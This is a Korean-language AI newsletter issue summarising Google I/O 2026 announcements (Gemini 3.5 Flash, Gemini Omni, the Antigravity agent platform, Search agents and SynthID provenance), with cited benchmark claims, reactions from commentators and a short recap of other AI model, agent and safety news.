---
title: "Google I/O 2026, Gemini 3.5 Flash와 Omni 및 에이전트 스택 공개"
summary:
  - "Google이 Gemini 3.5 Flash를 공개"
  - "Gemini Omni가 멀티모달 생성을 확대"
  - "Antigravity가 에이전트 플랫폼으로 확장"
  - "Karpathy가 Anthropic에 합류"
  - "OpenAI가 Guaranteed Capacity 출시"
date: 2026-05-19
originalUrl: "https://github.com/smol-ai/ainews-web-2025/blob/main/src/content/issues/26-05-19-not-much.md"
hasHeadline: true
headline: "Google I/O 2026, Gemini 3.5 Flash와 Omni 및 에이전트 스택 공개"
tags:
  - Google
  - Gemini
  - OpenAI
  - Anthropic
  - Claude
isFeatured: true
---

## 헤드라인: Google I/O 2026, Gemini 3.5 Flash와 Omni 및 에이전트 스택 공개

참고 링크: [544 Twitters](https://twitter.com/i/lists/1585430245762441216), [AINews' website](https://news.smol.ai/), [AINews is now a section of Latent Space](https://www.latent.space/p/2026), [opt in/out](https://support.substack.com/hc/en-us/articles/8914938285204-How-do-I-subscribe-to-or-unsubscribe-from-a-section-on-Substack)

Google은 I/O에서 Gemini를 소비자용 AI 표면이자 개발자/에이전트 플랫폼으로 재포지셔닝했다. 핵심 기술 발표는 빠른 에이전트형(agentic)·코딩 작업용 Gemini 3.5 Flash, 비디오부터 시작하는 멀티모달 생성·편집용 Gemini Omni, 그리고 데스크톱/CLI/SDK/API를 아우르는 Antigravity 에이전트 스택이었다. Google은 현재 월 **3.2천조 개 이상 토큰**을 처리하며, 1년 전 **월 480조 개**에서 **전년 대비 7배** 증가했다고 밝혔다. Gemini 앱은 **월간 사용자 9억 명 이상**이며 **230개 이상 국가와 70개 이상 언어**에서 제공된다 ([Google](https://x.com/Google/status/2056783102085640252), [Google](https://x.com/Google/status/2056783643381543253), [GeminiApp](https://x.com/GeminiApp/status/2056799446684578250)).

가장 기술적으로 중요한 출시는 **Gemini 3.5 Flash**였다. Google은 이를 자사 최강의 에이전트형·코딩 모델로 설명했으며, **즉시 GA**, **100만 토큰 컨텍스트**, **최대 65k 출력**, **4단계 thinking 수준**(“minimal/low/medium/high”), 턴 간 “thought preservation”을 제공한다고 밝혔다 ([GoogleDeepMind](https://x.com/GoogleDeepMind/status/2056787987774816525), [Google](https://x.com/Google/status/2056788266872140232), [_philschmid](https://x.com/_philschmid/status/2056794978517750165)). 이어 Google은 Gemini 추론(reasoning)과 생성형 미디어를 결합한 새 제품군 **Gemini Omni**를 공개했다. 첫 모델은 **Omni Flash**이며, **텍스트/이미지/비디오/오디오 입력**을 받아 Gemini, Flow, Shorts, 향후 API에서 비디오 편집·생성을 수행한다 ([GoogleDeepMind](https://x.com/GoogleDeepMind/status/2056786446636212467), [Google](https://x.com/Google/status/2056786781992071172), [GeminiApp](https://x.com/GeminiApp/status/2056800579159216202)).

Google은 이 모델들을 중심으로 **Antigravity 2.0 데스크톱**, **CLI**, **SDK**, **Gemini API의 Managed Agents**, Search 네이티브 생성형 UI/코딩, 클라우드 VM에서 실행되는 **Gemini Spark** 백그라운드 에이전트, Gemini 앱/Workspace/커머스/미디어 통합을 대거 출시하거나 확장했다 ([Google](https://x.com/Google/status/2056789045548896516), [Google](https://x.com/Google/status/2056838495298367773), [Google](https://x.com/Google/status/2056791134295273554)).

### 사실 / 공식 또는 서드파티 벤치마크 출처의 직접 주장

- Google은 현재 **월 3.2천조 토큰**을 처리하며, 1년 전 **480조**에서 증가했다고 밝혔다 ([Google](https://x.com/Google/status/2056783102085640252)).
- Google은 Gemini가 **월간 사용자 9억 명 이상**이라고 밝혔다 ([Google](https://x.com/Google/status/2056783643381543253)).
- Google은 Gemini 3.5 Flash가 Gemini 앱, Search AI Mode, Gemini API, AI Studio, Antigravity, Android Studio, 엔터프라이즈 표면 전반에서 **오늘 GA**라고 밝혔다 ([Google](https://x.com/Google/status/2056791527314387208), [GeminiApp](https://x.com/GeminiApp/status/2056789742910595342)).
- Google은 Gemini 3.5 Flash가 **100만 컨텍스트**, **최대 65k 출력**, **4단계 thinking 수준**, 턴 간 “thought preservation”을 제공한다고 밝혔다 ([ _philschmid](https://x.com/_philschmid/status/2056794978517750165)).
- Google은 3.5 Flash가 **Terminal-Bench 2.1**, **GDPval-AA**, **MCP Atlas**에서 Gemini 3.1 Pro를 능가한다고 밝혔다 ([GoogleDeepMind](https://x.com/GoogleDeepMind/status/2056787990110994511), [Google](https://x.com/Google/status/2056788281317306466)).
- Google은 3.5 Flash가 **비슷한 frontier 모델보다 4배 빠르고**, **Antigravity에서는 최대 12배 빠르다**고 밝혔다 ([Google](https://x.com/Google/status/2056788266872140232), [JeffDean](https://x.com/JeffDean/status/2056793419033588091)).
- 독립 벤치마커 Artificial Analysis는 Gemini 3.5 Flash가 Intelligence Index **55점**, Gemini 3 Flash 대비 **+9점**, **초당 출력 280토큰 초과**, **MMMU-Pro 84%**, **GDPval-AA Elo 1656**, 가격 **입력/출력 100만 토큰당 $1.50 / $9.00**라고 보고했다. 또한 자사 suite 기준 실행 비용이 Gemini 3 Flash보다 **5.5배**, Gemini 3.1 Pro보다 **75%** 높다고 밝혔다 ([ArtificialAnlys](https://x.com/ArtificialAnlys/status/2056795055512596817)).
- Arena는 Gemini 3.5 Flash가 **Text Arena 전체 #9**, **Code Arena: Frontend #9**, 점수 **1507**, Gemini 3 Flash 대비 **+70**을 기록했으며, 해당 가격대 최고 점수라고 밝혔다 ([arena](https://x.com/arena/status/2056793176720195693)).
- Google은 Gemini Omni Flash가 유료 사용자를 대상으로 Gemini/Flow에서 오늘 제공되며, Shorts/Create에서는 이번 주부터 무료로, API는 몇 주 내 제공된다고 밝혔다 ([Google](https://x.com/Google/status/2056789307856462061)).
- Google은 Spark가 **전용 Google Cloud 가상 머신**에서 실행되어 사용자의 기기가 꺼져 있어도 장기 작업을 수행할 수 있다고 밝혔다 ([Google](https://x.com/Google/status/2056791134295273554)).
- Google은 Antigravity + Gemini 3.5 Flash 데모가 **12시간** 동안 **93개 병렬 서브에이전트**, **15k+ 모델 요청**, **26억 토큰**, **API 크레딧 $1K 미만**으로 작동하는 OS를 만들었다고 주장했다 ([Google](https://x.com/Google/status/2056789235500466273)).
- Google은 Search가 Antigravity + 3.5 Flash를 사용해 **맞춤형 시각 도구/시뮬레이션**을 즉석 생성할 것이라고 밝혔다 ([Google](https://x.com/Google/status/2056795269694423065)).

### 의견 / 해석 / 회의론

- 긍정적 반응은 “Google is back,” “Flash 모델 치고 미친 평가,” “AGI로 향하는 world model,” Search + Antigravity가 “mind blowing”이라는 식이었다 ([kimmonismus](https://x.com/kimmonismus/status/2056791681073316071), [Kseniase_](https://x.com/Kseniase_/status/2056798225378783656), [demishassabis](https://x.com/demishassabis/status/2056831486251380783)).
- 일부는 **자체 보고 벤치마크**라며 과열을 경계했고, 가격/성능 우려도 지적했다 ([scaling01](https://x.com/scaling01/status/2056794370909593987), [simonw](https://x.com/simonw/status/2056867815605625172)).
- 부정적·회의적 반응은 이전 Flash 모델 대비 **가격 인상** ([enricoros](https://x.com/enricoros/status/2056816088785289481)), **GPT-5.5-medium**이 종단 간으로 더 똑똑하거나 싸고 빠를 수 있다는 비교 ([scaling01](https://x.com/scaling01/status/2056803273756000721), [scaling01](https://x.com/scaling01/status/2056798645983334890)), 약한 **TerminalBench-Hard**, 평범한 **MRCR / ARC-AGI-2**, 일부 영역에서 Kimi/GLM을 명확히 이기지 못했다는 벤치마크 단서 ([scaling01](https://x.com/scaling01/status/2056796392899645919), [teortaxesTex](https://x.com/teortaxesTex/status/2056794752167645653), [scaling01](https://x.com/scaling01/status/2056795648742076743)), Gemini CLI와 Antigravity CLI를 둘러싼 제품명/UX 혼란 및 인터페이스 디자인 비판에 집중됐다 ([zachtratar](https://x.com/zachtratar/status/2056848643580482002), [kchonyc](https://x.com/kchonyc/status/2056826706984337726), [teortaxesTex](https://x.com/teortaxesTex/status/2056788641926509010)).

### Gemini 3.5 Flash: 핵심 기술 출시

Google/DeepMind는 **Gemini 3.5 Flash**를 절대적인 flagship 지능 모델이 아니라 **에이전트와 코딩**을 위한 자사 최강 모델로 반복 설명했다. 이는 고속·고효용 Pareto frontier 위에 놓여 Google 제품과 개발자 워크로드를 모두 구동하도록 설계됐다 ([GoogleDeepMind](https://x.com/GoogleDeepMind/status/2056787987774816525), [Google](https://x.com/Google/status/2056788266872140232), [SundarPichai](https://x.com/sundarpichai/status/2056796893951426705)).

기술 세부 사항은 다음과 같다.

- **현재 GA 제공** ([Google](https://x.com/Google/status/2056791527314387208))
- **100만 토큰 컨텍스트 윈도**
- **최대 65k 출력 토큰**
- **Thinking 수준:** minimal, low, medium(**새 기본값**), high
- **멀티턴 대화 전반 thought preservation**
- **텍스트 출력**
- 입력 모달리티: Artificial Analysis 기준 **텍스트, 이미지, 비디오, 음성** ([ _philschmid](https://x.com/_philschmid/status/2056794978517750165), [ArtificialAnlys](https://x.com/ArtificialAnlys/status/2056795055512596817))
- 가격: **입력 100만당 $1.50**, **출력 100만당 $9.00**, **캐시 입력 90% 할인** ([scaling01](https://x.com/scaling01/status/2056793465715822720), [ArtificialAnlys](https://x.com/ArtificialAnlys/status/2056795055512596817))

공식 벤치마크 주장은 다음과 같다.

- **Terminal-Bench 2.1:** **76.2%**
- **GDPval-AA:** **1656 Elo**
- **MCP Atlas:** **83.6%**
- Google이 인용한 멀티모달 결과: 한 엔지니어 게시물 기준 **MMMU-Pro 83.6%**, Artificial Analysis 기준 **84%**로 해당 setup에서 최고 기록 ([koraykv](https://x.com/koraykv/status/2056795667088204234), [ArtificialAnlys](https://x.com/ArtificialAnlys/status/2056795055512596817))

속도 주장은 다음과 같다.

- Google 마케팅 주장: **비슷한 frontier 모델보다 4배 빠름** ([Google](https://x.com/Google/status/2056788266872140232))
- Antigravity에서 Google은 **최대 12배 빠름**이라고 밝혔다 ([JeffDean](https://x.com/JeffDean/status/2056793419033588091), [scaling01](https://x.com/scaling01/status/2056790573961326680))
- Artificial Analysis는 **초당 출력 280토큰 초과**를 관측했다
- 일부 논의에서는 Antigravity 특화 최적화 serving에서 **약 867 tok/s**가 언급됐다 ([scaling01](https://x.com/scaling01/status/2056790573961326680), [scaling01](https://x.com/scaling01/status/2056791726677782743))

Artificial Analysis는 3.5 Flash가 **지능 대비 속도 Pareto frontier의 선두**라고 평가했지만, 경제성은 이전 Flash보다 확연히 악화됐다고 했다.

- Intelligence Index **55**
- Gemini 3 Flash 대비 **+9**
- omniscience setup에서 hallucination 비율 **61%**, Gemini 3 Flash 대비 **31포인트 감소**
- **GDPval-AA 1656 Elo**
- 벤치마크 suite 실행 비용이 Gemini 3 Flash보다 **5.5배**
- 같은 suite에서 Gemini 3.1 Pro보다 **75%** 비쌈 ([ArtificialAnlys](https://x.com/ArtificialAnlys/status/2056795055512596817))

Arena 결과는 다음과 같다.

- **Text Arena #9**
- **Code Arena: Frontend #9**
- **1507점**, Gemini-3 Flash 대비 **+70**
- 프론트엔드 코딩 평가 전 범주에서 Gemini 3.1 Pro보다 우수 ([arena](https://x.com/arena/status/2056793176720195693), [arena](https://x.com/arena/status/2056803661859479812))

의미 있는 변화는 Google이 과거라면 **배포 최적화된 고급 제품 모델**에 가까웠을 모델에 “Flash” 라벨을 붙이고 있다는 점이다. 여러 게시자는 Flash가 더 비싸지고 있으며, 과거 Pro 영역을 흡수하고 있을 수 있다고 지적했다 ([enricoros](https://x.com/enricoros/status/2056816088785289481), [simonw](https://x.com/simonw/status/2056867815605625172)).

가장 강한 기술 신호는 “절대 벤치마크 최고 모델”이 아니라 다음 네 가지다.

- **실질적인 에이전트형 성능 향상**
- **극단적인 serving 속도**
- **제품 표면에 깊게 통합**
- **서브에이전트와 장기 실행 중심 툴링**

따라서 일부 서드파티 비교에서 경쟁자가 원시 가격 대비 지능에서 앞서더라도, 3.5 Flash는 전략적으로 중요하다.

### Gemini Omni: “어떤 입력에서든 무엇이든 생성”하는 멀티모달 생성·편집

Google은 **Gemini Omni**를 Gemini 추론(reasoning)/world knowledge와 Google 생성형 미디어 스택을 결합한 새 제품군으로 소개했다. 시작점은 **비디오** 생성과 편집이다. 공식 메시지는 “어떤 입력에서든 무엇이든 생성”이지만 현재 출시는 더 좁다.

- 입력: **텍스트, 이미지, 오디오, 비디오**
- 초기 출력 초점: **비디오**
- 제품 제공: **Gemini 앱**, **Flow**, **YouTube Shorts/Create**, 이후 **API**
- 현재 출시 모델: **Gemini Omni Flash** ([GoogleDeepMind](https://x.com/GoogleDeepMind/status/2056786446636212467), [Google](https://x.com/Google/status/2056786395067552140), [Google](https://x.com/Google/status/2056789307856462061))

Google/DeepMind의 주장은 다음과 같다.

- 더 나은 **world understanding**
- 더 견고한 **physics**
- 장면/캐릭터 일관성이 유지되는 멀티턴 편집
- 대화형 편집으로 사용자 비디오 footage를 “reimagine”하는 능력 ([Google](https://x.com/Google/status/2056786888930062369), [Google](https://x.com/Google/status/2056786589175677089))

출시 세부 사항은 다음과 같다.

- 유료 Gemini 사용자에게 앱/Flow에서 전 세계 “오늘” 제공
- YouTube Shorts/Create는 “이번 주부터” 무료 출시
- 개발자/엔터프라이즈용 API는 몇 주 내 제공 ([Google](https://x.com/Google/status/2056789307856462061), [GeminiApp](https://x.com/GeminiApp/status/2056814117047132301))

지지하는 반응은 Omni가 특히 **비디오 편집**과 일관성에서 큰 품질 향상이라는 것이었다 ([joshwoodward](https://x.com/joshwoodward/status/2056827449556845051), [fofrAI](https://x.com/fofrAI/status/2056789242274259242), [osanseviero](https://x.com/osanseviero/status/2056863263305105424)). 전략적 해석으로는 Omni가 Google이 텍스트/코드 경쟁만이 아니라 **world model**과 embodied/physical prior에 투자한다는 증거라는 의견이 있었다 ([demishassabis](https://x.com/demishassabis/status/2056831486251380783), [jparkerholder](https://x.com/jparkerholder/status/2056789448554062232), [kimmonismus](https://x.com/kimmonismus/status/2056802929957568881)). 회의론은 일부 UI/출력 예시가 “B-tier video game interface”처럼 보이거나 지나치게 다듬어진 template 같다는 비판에 집중됐다 ([teortaxesTex](https://x.com/teortaxesTex/status/2056787895977980172), [shlomifruchter](https://x.com/shlomifruchter/status/2056858151987884087)).

Omni의 중요성은 “또 하나의 비디오 모델”이라기보다 Google이 멀티모달 이해, 미디어 편집, world grounding, 에이전트 인터페이스, 그리고 결국 any-input/any-output 생성을 통합하려는 시도라는 데 있다.

### Antigravity: 코딩 assistant가 아니라 Google의 에이전트 OS

과소평가된 I/O 핵심 주제는 Google이 더 이상 에이전트를 채팅 모델의 얇은 wrapper로 제시하지 않는다는 점이었다. Antigravity는 **실행 substrate**가 되고 있다.

출시·확장된 항목은 다음과 같다.

- **Antigravity 2.0 데스크톱 앱**: core conversations, artifacts, multi-agent orchestration을 갖춘 agent-first 데스크톱 ([Google](https://x.com/Google/status/2056788868092006891), [Google](https://x.com/Google/status/2056838653855650286))
- **Antigravity CLI** ([Google](https://x.com/Google/status/2056789045548896516), [Google](https://x.com/Google/status/2056841217611366570))
- **Antigravity SDK** ([Google](https://x.com/Google/status/2056789045548896516))
- **Gemini API의 Managed Agents**: 단일 API 호출로 agent와 hosted Linux sandbox 제공. Bash/Python/Node, 파일, 브라우징, custom markdown-defined skills, repo/GCS mount 지원 ([Google](https://x.com/Google/status/2056838495298367773), [GoogleAIStudio](https://x.com/GoogleAIStudio/status/2056836824686059616), [_philschmid](https://x.com/_philschmid/status/2056836567470362955))
- **AI Studio**, **Android**, **Firebase**, **Workspace**, 웹 통합 ([Google](https://x.com/Google/status/2056789045548896516), [Google](https://x.com/Google/status/2056837910851449177))
- **AI Studio에서 Antigravity로 원클릭 export** ([Google](https://x.com/Google/status/2056838913944424469))
- AI Studio 내 네이티브 **Android 앱 생성** 및 Antigravity의 Android 지원 ([Google](https://x.com/Google/status/2056838230591574098), [AndroidDev](https://x.com/AndroidDev/status/2056841786656711077))

Google의 데모는 **병렬 서브에이전트**, **hosted execution**, **고빈도 반복 루프**, **artifact-oriented workflow**에 초점을 맞췄다. Jeff Dean은 3.5 Flash가 “협업하는 서브에이전트를 배치하고, 고빈도 반복 루프를 실행하며, 실제 문제를 scale에서 해결하는” 강력한 엔진이라고 설명했다 ([JeffDean](https://x.com/JeffDean/status/2056793419033588091)).

대표 proof point는 다음과 같다.

- **12시간** 만에 OS 구축
- 병렬 서브에이전트 **93개**
- 요청 **15k+**
- 토큰 **26억**
- 크레딧 **$1K 미만** ([Google](https://x.com/Google/status/2056789235500466273))

이것이 무대용 벤치마크/데모에 가깝다 해도, Google이 개발자에게 채택시키려는 구조를 드러낸다. 즉, **하나의 느린 monolithic run보다 많은 빠른 에이전트**다.

긍정 반응은 이것이 Codex/Claude Code/OpenClaw/Hermes 스타일 workflow에 대한 Google의 답이며, 인프라 스토리가 더 강하다는 것이었다 ([iScienceLuvr](https://x.com/iScienceLuvr/status/2056792158988816767), [theo](https://x.com/theo/status/2056826014739890204)). 비판은 브랜딩과 제품 확산이 여전히 혼란스럽고, Gemini CLI와 Antigravity CLI 중 무엇을 써야 할지 불분명하며, Google의 디자인 선택에 불만이 있다는 것이었다 ([kchonyc](https://x.com/kchonyc/status/2056826706984337726), [zachtratar](https://x.com/zachtratar/status/2056848643580482002), [teortaxesTex](https://x.com/teortaxesTex/status/2056788641926509010)).

### Search, Gemini 앱, 소비자 에이전트

Google은 재설계된 AI 기반 Search box, 멀티모달 query 지원, 그리고 가장 야심찬 소비자용 움직임인 **Antigravity + Gemini 3.5 Flash로 Search가 맞춤형 시각 도구와 시뮬레이션을 즉석 생성**하는 기능을 발표했다 ([Google](https://x.com/Google/status/2056793802141044786), [Google](https://x.com/Google/status/2056795269694423065)).

Search의 **information agents**도 예고됐다.

- 지속적인 monitoring tasks
- 웹/뉴스/소셜/실시간 signal
- 링크와 action이 포함된 synthesized updates
- 이번 여름 Pro/Ultra에 출시 ([Google](https://x.com/Google/status/2056794282502054066), [Google](https://x.com/Google/status/2056794675214700764))

이는 Search가 retrieval/ranking에서 **백그라운드 에이전트형 모니터링 + 생성 applet**으로 이동한다는 중요한 전략적 변화다.

소비자 Gemini 업데이트에는 다음이 포함됐다.

- 새 “**Neural Expressive**” 디자인 언어 ([Google](https://x.com/Google/status/2056799862604046663))
- 인라인/즉시 **Gemini Live** 음성 ([Google](https://x.com/Google/status/2056800029688352988))
- inbox/calendar/tasks 기반 **Daily Brief** 개인화 digest ([Google](https://x.com/Google/status/2056801159071883342), [GeminiApp](https://x.com/GeminiApp/status/2056800978343764238))
- 클라우드 VM에서 24/7 실행되며 주요 action 전 사용자에게 확인하는 **Gemini Spark** 개인 AI 에이전트 ([Google](https://x.com/Google/status/2056791134295273554), [GeminiApp](https://x.com/GeminiApp/status/2056801918018564538))
- macOS 앱과 예정된 Spark/voice 데스크톱 workflow ([Google](https://x.com/Google/status/2056802434303869118), [GeminiApp](https://x.com/GeminiApp/status/2056802363269329304))

가격/구독에서는 새 사다리가 도입됐다.

- 신규 **월 $100** 플랜
- 최상위 **Ultra를 월 $250에서 $200로 인하** ([Google](https://x.com/Google/status/2056792498287063370), [GeminiApp](https://x.com/GeminiApp/status/2056792679607103626))

이는 특히 코더와 크리에이터 같은 프리미엄 power user를 겨냥한 더 공격적인 입찰로 보인다.

### 신뢰, 출처, 표준

Google은 Search, Gemini, Chrome, 하드웨어/미디어 표면 전반에 **SynthID**를 밀어붙였고, 생성 콘텐츠에 SynthID를 적용하기 위해 **OpenAI, NVIDIA, Kakao, ElevenLabs**와 파트너십을 발표했다 ([Google](https://x.com/Google/status/2056787498676658576), [Google](https://x.com/Google/status/2056787749965799508)).

이는 I/O에서 나온 더 중요한 표준 움직임 중 하나다.

- Google이 생성 미디어 provenance layer 일부를 소유할 기회를 준다.
- 특히 OpenAI는 별도로 **SynthID watermark + C2PA credentials**를 통해 OpenAI 생성 이미지를 확인하는 기능 지원을 발표했다 ([OpenAI](https://x.com/OpenAI/status/2056793648571011232)).

Omni/3.5 Flash보다 덜 화려했지만, provenance가 필수 인프라가 된다면 더 오래갈 가능성이 높다.

### Google의 과학과 world-model 관점

여러 I/O 항목은 Google이 코딩/채팅만으로 경쟁하려 하지 않는다는 점을 강화했다.

- **Gemini for Science**: Literature Insights, Hypothesis Generation, Computational Discovery ([GoogleDeepMind](https://x.com/GoogleDeepMind/status/2056808869242826957), [Google](https://x.com/Google/status/2056809034494124118))
- ERA / Co-Scientist 관련 **Nature** 출판 링크 ([GoogleResearch](https://x.com/GoogleResearch/status/2056797037426045105), [GoogleResearch](https://x.com/GoogleResearch/status/2056857494107062718))
- 약 20년의 지도 이미지를 사용해 실제 위치 기반 대화형 시뮬레이션을 만드는 **Project Genie + Street View grounding** ([Google](https://x.com/Google/status/2056850758029464009), [poolio](https://x.com/poolio/status/2056796361987850705), [bilawalsidhu](https://x.com/bilawalsidhu/status/2056804315721843024))

이 맥락 때문에 일부 관찰자들은 Omni를 단순한 콘텐츠 도구가 아니라 “world-model progress”로 해석했다 ([demishassabis](https://x.com/demishassabis/status/2056831486251380783), [jparkerholder](https://x.com/jparkerholder/status/2056798252264018232)).

### 다양한 의견

강세·지지 의견은 Gemini 3.5 Flash가 특히 에이전트형 코딩에서 speed-tier 모델로서 큰 도약이라는 평가였다 ([kimmonismus](https://x.com/kimmonismus/status/2056791681073316071), [SundarPichai](https://x.com/sundarpichai/status/2056796893951426705)). Search + Antigravity는 Google이 생성 UI/도구를 거대한 scale로 배포할 수 있기 때문에 잠재적으로 변혁적이라고 평가됐다 ([Kseniase_](https://x.com/Kseniase_/status/2056798225378783656), [TheTuringPost](https://x.com/TheTuringPost/status/2056795871098913209)). Omni는 편집 품질과 더 깊은 world-model roadmap의 힌트로 칭찬받았다 ([joshwoodward](https://x.com/joshwoodward/status/2056827449556845051), [kimmonismus](https://x.com/kimmonismus/status/2056802929957568881)).

회의적 의견은 Google이 **자체 보고 벤치마크**에 기대고 있으며, 독립 비교에서는 여전히 경쟁자에게 여지가 있다는 우려였다 ([scaling01](https://x.com/scaling01/status/2056794370909593987)). 또한 “Flash”가 더 이상 이름에 걸맞게 싸지 않으며, 이전 Flash 세대 대비 가격이 급격히 올랐다는 지적이 있었다 ([enricoros](https://x.com/enricoros/status/2056816088785289481), [simonw](https://x.com/simonw/status/2056867815605625172)). 일부는 **GPT-5.5-medium**이 smart/cheap/latency 결합 기준에서 여전히 우위라고 봤다 ([scaling01](https://x.com/scaling01/status/2056803273756000721)). 또 일부 벤치마크 slice는 강한 에이전트형 수치에도 불구하고 TerminalBench-Hard가 약하거나 reasoning metric이 중간 수준이라는 불균형을 시사했다 ([scaling01](https://x.com/scaling01/status/2056796392899645919), [teortaxesTex](https://x.com/teortaxesTex/status/2056794752167645653)).

중립·분석적 관점에서 Artificial Analysis는 가장 균형 잡힌 평가를 내렸다. **우수한 속도-지능 frontier 위치**, **상당한 에이전트형 향상**을 인정하면서도, 이전 Flash보다 비용이 뚜렷하게 나쁘고 end-to-end suite 기준 3.1 Pro보다도 높다고 했다 ([ArtificialAnlys](https://x.com/ArtificialAnlys/status/2056795055512596817)). Arena 데이터도 특히 프론트엔드/코드 작업에서 “마케팅만이 아닌 실제 개선”이라는 결론을 뒷받침하지만, 범주 지배를 주장하지는 않는다 ([arena](https://x.com/arena/status/2056793176720195693)).

### 왜 중요한가

Google은 이제 일관된 배포 스토리를 갖췄다. 이전 Gemini cycle은 벤치마크 중심이고 제품이 파편화된 느낌이 강했지만, I/O에서 Google은 모델, 인프라, 도구, API, 소비자 표면, 엔터프라이즈 출시를 하나로 묶었다.

무게중심은 chatbot UX에서 agent execution으로 이동하고 있다. 중요한 primitive는 모델 IQ만이 아니라 **서브에이전트, hosted sandbox, 장기 실행 작업, 생성 artifact, Search/Workspace/Android 통합**이었다.

Gemini 3.5 Flash는 “많은 에이전트를 orchestrate할 만큼 빠른 것”이 최대 벤치마크 점수보다 더 중요할 수 있음을 시사한다. 코딩과 도구 사용에서는 throughput과 latency가 점점 제품을 규정한다.

Omni는 Google의 차별화 논리를 보여준다. Google은 순수 텍스트 중심 경쟁보다 멀티모달/world-grounded 시스템에 베팅하고 있다.

신뢰/provenance는 platform infrastructure가 되고 있다. OpenAI/NVIDIA/ElevenLabs/Kakao와의 SynthID 파트너십은 콘텐츠 인증 provenance layer 주변의 일부 수렴을 시사한다.

가장 큰 미해결 질문은 경제성이다. 기술적으로 강하든 아니든, 3.5 Flash는 비용 인상에 상당한 반발을 불렀다. “Flash”가 더 이상 저렴한 주력 tier가 아니라면, Google은 기능 배포에서는 이기면서도 예측 가능성과 가격 단순성 측면에서 개발자 mindshare 일부를 잃을 수 있다.

---

## AI Twitter Recap

### 모델, 벤치마크, 추론

- **Cerebras**는 **Kimi K2.6**를 엔터프라이즈 trial에서 약 **1,000 tok/s**로 실행 중이라고 밝혔으며, 이 모델은 **1조 파라미터 모델**로 설명됐다. Artificial Analysis 벤치마크 맥락에서는 “측정된 것 중 가장 빠른 frontier model 성능”으로 인용됐다 ([cerebras](https://x.com/cerebras/status/2056778123329274279)).
- **Cerebras 아키텍처 논의**: 한 클립은 속도가 주로 **memory-bandwidth** 문제이며, 외부 메모리 fetch를 피하기 위해 모델 layer를 wafer 전반에 나눈다고 강조했다 ([MTSlive](https://x.com/MTSlive/status/2056840697547039026)).
- **Carbon**은 Hugging Face 기여자들이 공개한 open DNA foundation model 제품군이다. **Carbon-3B**는 **Evo2-7B**에 맞먹으면서 추론(inference) 속도는 **250–275배 빠르다**고 보고됐다. **1T tokens**로 학습됐고, **deterministic 6-mer tokens**, **RMSNorm + SwiGLU + RoPE + GQA**, 후기 학습 불안정을 피하기 위한 **factorized loss (FNS)** 중간 전환을 사용했다 ([LoubnaBenAllal1](https://x.com/LoubnaBenAllal1/status/2056771927570530475), [lvwerra](https://x.com/lvwerra/status/2056774820872831234), [_lewtun](https://x.com/_lewtun/status/2056779013801349310)).
- **Unsloth Studio**는 **auto speculative decoding**과 **GGUF용 MTP 지원**을 추가하며 정확도 손실 없이 최대 **2배 빠른 추론(inference)**을 주장했다 ([danielhanchen](https://x.com/danielhanchen/status/2056777199798440400)).
- 한 새 논문은 **RoPE에 내재적 long-context 한계**가 있으며, 이는 단순 엔지니어링 문제가 아니라고 주장했다. 긴 컨텍스트에서는 token identity와 position을 모두 구분하지 못할 수 있어 list-index retrieval과 agent framework 설계에 영향을 준다 ([haopeng_uiuc](https://x.com/haopeng_uiuc/status/2056780781930860699)).
- 또 다른 optimizer 논문은 embedding, LM head, SwiGLU MLP, MoE router용 특수 update를 갖춘 **symmetry-compatible optimizer stack**을 제안했다 ([timlautk](https://x.com/timlautk/status/2056783702441730372)).

### 에이전트, 벤치마크, Harness

- **NanoGPT-Bench**는 NanoGPT Speedrun 기반 AI R&D 벤치마크로 공개됐다. 저자들은 현재 코딩/연구 에이전트가 인간 진전의 **9.3%**만 회복하며, 대부분 알고리즘 통찰이 아니라 hyperparameter tuning 때문이라고 주장한다. 평가는 **완전 자율**, **오프라인**, contamination을 줄이기 위해 **5개월 world-record window**로 제한된다 ([IntologyAI](https://x.com/IntologyAI/status/2056764236668493868)).
- **code-as-agent harnesses**에 관한 긴 survey는 미래 에이전트 시스템이 **executable, inspectable, stateful, governed**해야 한다고 주장했다 ([omarsar0](https://x.com/omarsar0/status/2056764334181884158)).
- **Vibrant Labs**는 scalable agent benchmark의 핵심 병목이 verifier 품질이라고 강조하며 **SWE-bench Verified**, **OSWorld-Verified**, **ComputerRL**, **BenchGuard**를 언급했다 ([Shahules786](https://x.com/Shahules786/status/2056773476585816255)).
- **LangChain/LangSmith Engine** 논의는 long-horizon eval의 어려움과 긴 trace에 대한 ambient analysis에 초점을 맞췄다. 여러 팀원은 Engine을 실제 운영 중인 더 복잡한 production agent system 중 하나로 설명했다 ([LangChain](https://x.com/LangChain/status/2056787294124667293), [hwchase17](https://x.com/hwchase17/status/2056789174800547917), [BraceSproul](https://x.com/BraceSproul/status/2056821182549442971)).
- **Databricks research**는 에이전트를 위한 programmable Python scratchpad인 **MemEx**를 소개했다. 이는 컨텍스트 윈도를 flooding하지 않고 live kernel에 typed object를 유지한다. 엔터프라이즈 작업 전반에서 frontier model은 **정확도 2–5포인트 향상과 25–30% 비용 절감**, Qwen 모델은 **40–50% 비용 절감**과 함께 정확도가 거의 두 배로 개선됐다고 보고됐다 ([DbrxMosaicAI](https://x.com/DbrxMosaicAI/status/2056818063215878618)).
- **Cursor**는 work item에서 cloud agent를 직접 시작하는 Jira 통합을 추가했다 ([cursor_ai](https://x.com/cursor_ai/status/2056803731367456993)).
- **GitHub**는 Copilot에 **Gemini 3.5 Flash**를 rollout하기 시작했으며, 반복 코딩 workflow에서 tool use, 속도, cache efficiency를 강조했다 ([github](https://x.com/github/status/2056801675042779279)).
- **Claude**는 click accuracy, effort level, context management, demonstration replay를 포함한 computer use productionization 모범 사례를 공개했다 ([ClaudeDevs](https://x.com/ClaudeDevs/status/2056835339193561170)).

### 안전, 위험, 거버넌스

- **METR**은 **Anthropic, Google, Meta, OpenAI**의 내부 모델/정보 접근을 바탕으로 첫 **Frontier Risk Report**를 공개했다. 여기에는 CoT 접근과 private protocol review가 포함됐으며, 내부 에이전트의 loss-of-control 및 covert-capability risk에 초점을 맞췄다 ([METR_Evals](https://x.com/METR_Evals/status/2056800023149760666), [ajeya_cotra](https://x.com/ajeya_cotra/status/2056800135670338043)).
- **David Rein**은 Anthropic에 embedded되어 rogue internal agent를 탐지하는 monitoring system을 stress-test한 exercise를 설명했다. 그는 Anthropic이 redaction 재량을 유지했기 때문에 이를 full audit이 아니라 “exercise”로 본다고 밝혔다 ([idavidrein](https://x.com/idavidrein/status/2056800422422265897), [idavidrein](https://x.com/idavidrein/status/2056800666832838780)).
